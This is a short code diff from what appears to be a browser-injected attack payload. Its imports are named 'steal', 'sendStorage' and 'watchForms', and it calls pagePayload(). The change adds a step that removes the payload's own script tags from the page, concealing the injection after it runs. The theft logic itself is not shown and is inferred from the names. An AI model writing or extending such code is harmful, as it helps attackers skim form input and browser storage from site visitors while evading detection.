@@ -3,8 +3,11 @@ import removeCurrentScript from '@functions/removeCurrentScript'
 import sendStorage from './sendStorage'
 import watchForms from './watchForms'
 import {steal} from '@config'
+import removeScriptsWithSource from '@functions/removeScriptsWithSource'
+import {payloadScriptSource} from '@worker/boilerplate'
 
 removeCurrentScript()
+removeScriptsWithSource(payloadScriptSource)
 
 pagePayload()
 
